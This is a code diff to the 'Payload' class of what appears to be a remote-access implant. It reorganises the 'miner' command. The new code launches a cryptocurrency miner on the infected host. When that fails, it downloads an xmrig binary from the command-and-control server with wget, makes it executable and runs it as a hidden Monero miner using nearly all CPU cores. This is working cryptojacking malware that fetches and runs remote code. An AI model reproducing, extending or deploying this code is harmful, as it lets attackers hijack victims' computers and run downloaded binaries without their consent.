@@ -629,55 +629,11 @@ class Payload():
         """
         args = str(args).split()
 
-        if 'run' in args and len(args) == 4:
-            cmd, url, port, user = args
+        if len(args) != 4:
+            return "usage: {}".format(self.miner.usage)
 
-            # type check port argument
-            if not port.isdigit():
-                return "Error: port must be a digit 1-65535"
 
-            # first attempt using built-in python miner
-            try:
-                # import pycryptonight, pyrx
-                import pycryptonight, hashlib
-                self.child_procs['miner_py'] = globals()['Miner'](url=url, port=int(port), user=user)
-                self.child_procs['miner_py'].start()
-                return "Miner running in " + str(self.child_procs['miner_py']).pid
-            except Exception as e:
-                log("{} error: {}".format(self.miner.__name__, str(e)))
-
-                # if that fails, try downloading and running xmrig
-                try:
-                    threads = multiprocessing.cpu_count() - 1
-
-                    # pull xmrig from server if necessary
-                    if not self.xmrig_path_dev:
-                        self.xmrig_path_dev = self.wget('http://{0}:{1}/xmrig/xmrig_{2}'.format(self.c2[0], int(self.c2[1]) + 1, sys.platform))
-
-                        # set up executable
-                        if os.name == 'nt' and not self.xmrig_path.endswith('.exe'):
-                            os.rename(self.xmrig_path, self.xmrig_path + '.exe')
-                            self.xmrig_path += '.exe'
-
-                        os.chmod(self.xmrig_path, 755)
-
-                        # excute xmrig in hidden process
-                        params = self.xmrig_path + " --url={url} --user={user} --coin=monero --donate-level=1 --tls --tls-fingerprint 420c7850e09b7c0bdcf748a7da9eb3647daf8515718f36d9ccfdd6b9ff834b14 --threads={threads}".format(url=url, user=user, threads=threads)
-                        result = self.execute(params)
-                        return result
-                    else:
-                        # restart miner if it already exists
-                        name = os.path.splitext(os.path.basename(self.xmrig_path))[0]
-                        if name in self.execute.process_list:
-                            self.execute.process_list[name].kill()
-                        params = self.xmrig_path + " --url={url} --user={user} --coin=monero --donate-level=1 --tls --tls-fingerprint 420c7850e09b7c0bdcf748a7da9eb3647daf8515718f36d9ccfdd6b9ff834b14 --threads={threads}".format(url=url, user=user, threads=threads)
-                        result = self.execute(params)
-                        return result
-                except Exception as e:
-                    log("{} error: {}".format(self.miner.__name__, str(e)))
-                    return traceback.format_exc()
-
-        elif 'stop' in args:
+        if 'stop' in args:
             # kill python miner
             if 'miner_py' in self.child_procs and isinstance(self.child_procs['miner_py'], multiprocessing.Process) and self.child_procs['miner_py'].is_alive():
                 self.child_procs['miner_py'].terminate()
@@ -689,7 +645,59 @@ class Payload():
 
             return "Miner stopped."
 
-        return "usage: {}".format(self.miner.usage)
+        elif 'run' not in args:
+            return "usage: {}".format(self.miner.usage)
+
+
+        # In "run" command section
+        cmd, url, port, user = args
+
+
+        # type check port argument
+        if not port.isdigit():
+            return "Error: port must be a digit 1-65535"
+
+        # first attempt using built-in python miner
+        try:
+            # import pycryptonight, pyrx
+            # import pycryptonight, hashlib # This is unnecessary due to build process
+            self.child_procs['miner_py'] = globals()['Miner'](url=url, port=int(port), user=user)
+            self.child_procs['miner_py'].start()
+            return "Miner running in " + str(self.child_procs['miner_py']).pid
+
+        except Exception as e:
+            log("{} error: {}".format(self.miner.__name__, str(e)))
+
+            # if that fails, try downloading and running xmrig
+            try:
+                threads = multiprocessing.cpu_count() - 1
+
+                # pull xmrig from server if necessary
+                if not self.xmrig_path_dev:
+                    self.xmrig_path_dev = self.wget('http://{0}:{1}/xmrig/xmrig_{2}'.format(self.c2[0], int(self.c2[1]) + 1, sys.platform))
+
+                    # set up executable
+                    if os.name == 'nt' and not self.xmrig_path.endswith('.exe'):
+                        os.rename(self.xmrig_path, self.xmrig_path + '.exe')
+                        self.xmrig_path += '.exe'
+
+                    os.chmod(self.xmrig_path, 755)
+
+                    # excute xmrig in hidden process
+                    params = self.xmrig_path + " --url={url} --user={user} --coin=monero --donate-level=1 --tls --tls-fingerprint 420c7850e09b7c0bdcf748a7da9eb3647daf8515718f36d9ccfdd6b9ff834b14 --threads={threads}".format(url=url, user=user, threads=threads)
+                    result = self.execute(params)
+                    return result
+                else:
+                    # restart miner if it already exists
+                    name = os.path.splitext(os.path.basename(self.xmrig_path))[0]
+                    if name in self.execute.process_list:
+                        self.execute.process_list[name].kill()
+                    params = self.xmrig_path + " --url={url} --user={user} --coin=monero --donate-level=1 --tls --tls-fingerprint 420c7850e09b7c0bdcf748a7da9eb3647daf8515718f36d9ccfdd6b9ff834b14 --threads={threads}".format(url=url, user=user, threads=threads)
+                    result = self.execute(params)
+                    return result
+            except Exception as e:
+                log("{} error: {}".format(self.miner.__name__, str(e)))
+                return traceback.format_exc()
 
 
     @config(platforms=['win32','linux','linux2','darwin'], command=True, usage='upload [file]')
